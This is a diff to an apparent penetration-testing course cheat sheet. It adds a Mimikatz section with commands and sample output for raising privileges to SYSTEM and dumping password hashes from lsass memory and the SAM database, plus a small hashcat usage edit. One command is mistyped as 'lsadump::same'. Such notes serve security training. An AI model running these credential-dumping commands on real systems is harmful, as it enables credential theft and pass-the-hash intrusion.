@@ -16,6 +16,10 @@ For reading, writing, manipulating image, audio, video and/ or PDF metadata
 For analyzing, reverse engineering, and extracting firmware images.
 
 
+## psexec
+
+
+
 # OSINT
 
 ### whois
@@ -2395,7 +2399,7 @@ hashcat –m 1400 –a 1 flag.hash cewl-megacorp.txt numbers.txt
 
 Usage:
 ```bash
-hashcat [options]... hash|hashfile|hccapxfile [dictionary|mask|directory]...
+hashcat [options]... hash|hashfile|hccapxfile wordlist [dictionary|mask|directory]...
 ```
 
 ### Options
@@ -3093,6 +3097,41 @@ unshadow passwd-file.txt shadow-file.txt > unshadowed.txt
 | --format=\[NAME\|CLASS\]\[,..\]           | Force hash of type NAME. The supported formats can be seen with --list=formats and --list=subformats. |
 \*See also doc/OPTIONS for more advanced selection of format(s), including using classes and wildcards.
 
+
+## Mimikatz
+Extracts plain-text passwords and hashes from various sources and stores them for further attacks (like pass-the-hash)
+- The _sekurlsa_ module extracts hashes from **lsass.exe** memory
+
+As **lsass** is privileged process running under SYSTEM, we have to start **mimikatz** from an admin cmd prompt.  
+
+Usage:  
+```powershell
+C:\Tools\password_attacks\mimikatz.exe  
+...  
+mimikatz # privilege::debug  
+	Privilege '20' OK  
+  
+mimikatz # token::elevate  
+	Token Id  :  0  
+	User name  :  
+	SID name  :  NT AUTHORITY\SYSTEM  
+	....  
+	-> Impersonated !  
+	....
+
+mimikatz # lsadump::same
+```
+
+**privilege::debug** - Enables the _SeDebugPrivilge_ access right req to tamper w/ another process.  
+	*If fails, mimikatz was most likely not executed w/in an admin cmd prompt  
+  
+**token::elevate** - Elevates security token from High Integrity (admin) to SYSTEM Integrity.  
+	*If launched from a system shell, this step's not required.  
+  
+	It is worth noting that the token module may list (**token::list**) & use (**token::elevate**) tokens for all users currently logged into the machine,  
+	which in some cases could be an administrator of someother machine.  
+  
+**lsadump::sam** - Dump contents of SAM db
 ## Removed from course
 
 ### Medusa
